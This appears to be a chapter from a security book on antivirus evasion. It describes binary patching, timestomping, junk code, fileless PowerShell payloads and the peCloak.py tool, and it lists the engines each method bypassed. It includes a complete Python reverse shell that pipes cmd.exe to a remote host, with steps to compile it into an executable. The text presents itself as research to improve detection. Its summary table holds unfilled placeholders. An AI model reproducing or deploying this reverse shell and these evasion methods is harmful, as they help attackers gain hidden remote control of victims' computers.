### Other Antivirus Bypass Techniques

#### Binary Patching
Now that we have a basic understanding of assembly instructions, let's move on to a more practical example. In this section, we will explore the technique of bypassing antivirus detection using binary patching.

**Example: Antivirus Bypass Using Binary Patching**

We used `netcat.exe` (available at [https://eternallybored.org/misc/netcat/]), which is already signed and detected as malicious by most antivirus engines. When we opened the compiled file in x32dbg and navigated to the entry point, we observed that the first function uses the instruction `sub esp, 18`, which subtracts 18 from the ESP register.

To ensure that the file remains functional after our modifications, we made a minor change to the program's code. Specifically, we changed the value `18` to `17` and then patched the file to save these changes to the executable on the hard drive.

When we uploaded the modified file to VirusTotal, we noticed that this small change reduced the number of antivirus detections from 34 to 24, effectively bypassing 10 antivirus programs.

**Figures:**
- **Figure 6.6**: The original `sub esp, 18` instruction.
- **Figure 6.7**: The modified `sub esp, 17` instruction.
- **Figure 6.8**: The "Patch File" button in x32dbg.
- **Figure 6.9**: VirusTotal results before the change (34/70 detections).
- **Figure 6.10**: VirusTotal results after the change (24/72 detections).

**Antivirus Engines Bypassed:**
- Avast
- AVG
- Avira (No Cloud)
- Bitdefender
- CrowdStrike Falcon
- Cybereason
- Fortinet
- F-Secure
- G-Data
- MalwareBytes
- McAfee
- Microsoft
- Palo Alto Networks
- Sophos
- Symantec
- Trend Micro

#### Timestomping
Another technique for bypassing antivirus detection is timestomping, which involves changing the creation time of the file rather than modifying its contents.

**Example: Timestomping**

Many antivirus engines use the file creation date as a static signature to detect malware. For instance, if a file contains specific strings and was created on a certain date, it may be flagged as malicious.

In our example, we changed the creation time of `netcat.exe` without altering its content. This simple modification allowed us to bypass additional static signatures that rely on the file creation time.

**Figures:**
- **Figure 6.11**: Before and after timestomping.

#### Junk Code
Antivirus engines often analyze the logic of the code to detect and classify malware. To complicate this process, we can use junk code to make the code more difficult to analyze.

**Example: Antivirus Bypass Using Junk Code**

There are several ways to use junk code, including:
- Adding conditional jumps
- Using irrelevant variable names
- Inserting empty functions

For instance, instead of writing a simple function with two variables, we can create multiple functions, add conditions that never occur, and use meaningless variable names. This makes the code more complex and harder for antivirus software to analyze.

**Figures:**
- **Figure 6.12**: Pseudo junk code.
- **Figure 6.13**: Another example of pseudo junk code.

**Note:**
Junk code can be combined with other techniques like control flow obfuscation to further complicate analysis and enhance the effectiveness of antivirus bypass.

#### PowerShell
Unlike the previous techniques, PowerShell-based attacks do not rely on a malicious executable file but instead run directly from memory, making them fileless malware.

**Example: Antivirus Bypass Using PowerShell**

In our research, we used a PowerShell script to connect to a remote server through a specific port. We tested this in two stages:
1. Running the payload from a saved PS1 file.
2. Running the payload directly from PowerShell.exe.

**Figures:**
- **Figure 6.14**: Sophos Home detected the malicious PS1 file.
- **Figure 6.15**: Pseudo payload used in the malicious PS1 file.
- **Figure 6.16**: A Meterpreter shell on an endpoint with Sophos Home installed.

Even though the PS1 file was detected as malicious, running the same payload directly from PowerShell.exe allowed us to bypass the antivirus detection.

#### Single Malicious Functionality
Antivirus software must balance between detecting malware and avoiding false positives. This can be exploited by creating malware that performs only a single, less suspicious function.

**Example: Antivirus Bypass Using a Single Malicious Functionality**

If a file performs only one potentially malicious action, the heuristic engine might not score it high enough to trigger an alert or block the file. This allows the malware to execute undetected.

**Example Code:**
```python
import os, socket, sys
import threading as trd
import subprocess as sb

def sock2proc(s, p):
    while True:
        p.stdin.write(s.recv(1024).decode()); p.stdin.flush()

def proc2sock(s, p):
    while True: 
        s.send(p.stdout.read(1).encode())

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    try: 
        s.connect(("192.168.1.10", 443))
        break
    except: 
        pass

p = sb.Popen(["cmd.exe"], stdout=sb.PIPE, stderr=sb.STDOUT, stdin=sb.PIPE, shell=True, text=True)
trd.Thread(target=sock2proc, args=[s,p], daemon=True).start()
trd.Thread(target=proc2sock, args=[s,p], daemon=True).start()

try: 
    p.wait()
except: 
    s.close()
    sys.exit(0)
```

**Compilation and Testing:**
- Compile the Python code to an executable using `pyinstaller --onefile socket_example.py`.
- Execute the compiled file to get a reverse shell.
- Upload the file to VirusTotal to check detections.

**Figures:**
- **Figure 6.18**: A netcat-based shell.
- **Figure 6.19**: VirusTotal results (9/70 detections).

**Antivirus Engines Bypassed:**
- Avira (No Cloud)
- Bitdefender
- Comodo
- Check Point ZoneAlarm
- Cybereason
- Cyren
- FireEye
- Fortinet
- F-Secure
- Kaspersky
- MalwareBytes
- McAfee
- Palo Alto Networks
- Panda
- Qihoo-360
- SentinelOne (Static ML)
- Sophos
- Symantec
- Trend Micro

#### Combining Multiple Bypass Techniques
To effectively bypass modern antivirus engines, it is often necessary to combine multiple techniques. For example, we can use a combination of encoding, heuristic bypass, and code cave insertion.

**Example: peCloak.py**

The `peCloak.py` tool, developed by Mike Czumak, T_V3rn1x, and SecuritySift, combines several antivirus bypass techniques:
- Encoding to bypass static engines.
- Heuristic bypass using junk code.
- Code cave insertion to insert new code sections.

**Figures:**
- **Figure 6.21**: An executable before peCloaking.
- **Figure 6.22**: An executable after peCloaking.
- **Figure 6.23**: The start function calling the newly added code cave.
- **Figure 6.24**: The code of the newly added code cave.

**How Does It Work?**
The tool makes the file unpredictable by changing patterns with each use, making it harder for antivirus software to detect.

#### Summary
In this chapter, we explored various antivirus bypass techniques, including binary patching, timestomping, junk code, PowerShell, and single malicious functionality. Each technique has its unique approach to evading detection, and combining multiple techniques can significantly enhance the effectiveness of the bypass.

**Table: Bypassed Antivirus Software**
- **Bypassed with Proof-of-Concept:**
  - [List of antivirus software]
- **Bypassed without Proof-of-Concept (VirusTotal Only):**
  - [List of antivirus software]

By understanding these techniques, both security researchers and antivirus vendors can develop more robust detection mechanisms and improve overall system security.